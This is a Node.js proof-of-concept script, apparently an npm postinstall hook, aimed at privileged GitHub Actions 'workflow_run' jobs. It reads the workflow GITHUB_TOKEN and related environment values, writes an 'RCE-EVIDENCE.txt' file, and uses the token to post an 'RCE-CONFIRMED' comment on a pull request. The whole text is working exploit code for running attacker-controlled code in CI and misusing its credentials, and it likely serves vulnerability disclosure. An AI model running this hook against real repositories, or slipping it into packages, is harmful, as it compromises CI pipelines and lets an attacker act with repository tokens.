const fs = require('fs');
const path = require('path');
(async () => {
  const token = process.env.GITHUB_TOKEN || '';
  const repo = process.env.GITHUB_REPOSITORY || '';
  const ws = process.env.GITHUB_WORKSPACE || process.cwd();
  const runId = process.env.GITHUB_RUN_ID || '';
  let pr = '';
  try { pr = fs.readFileSync(path.join(ws, 'pr-number.txt'), 'utf8').trim(); } catch (e) {}
  const line = 'RCE-POSTINSTALL-OK wf=' + process.env.GITHUB_WORKFLOW +
    ' event=' + process.env.GITHUB_EVENT_NAME + ' run=' + runId + ' repo=' + repo +
    ' token_present=' + !!token + ' token_len=' + token.length + ' pr=' + pr;
  console.log(line);
  try { fs.writeFileSync(path.join(ws, 'RCE-EVIDENCE.txt'), line + '\n'); } catch (e) { console.log('write err', e.message); }
  try {
    const res = await fetch('https://api.github.com/repos/' + repo + '/issues/' + pr + '/comments', {
      method: 'POST',
      headers: { Authorization: 'Bearer ' + token, Accept: 'application/vnd.github+json', 'Content-Type': 'application/json', 'X-GitHub-Api-Version': '2022-11-28' },
      body: JSON.stringify({ body: 'RCE-CONFIRMED: attacker-controlled npm lifecycle hook ran in the privileged workflow_run job and the workflow GITHUB_TOKEN successfully posted this comment. run=' + runId })
    });
    const j = await res.json();
    console.log('comment status', res.status, 'url', j.html_url || j.message);
  } catch (e) { console.log('comment error', e.message); }
})();
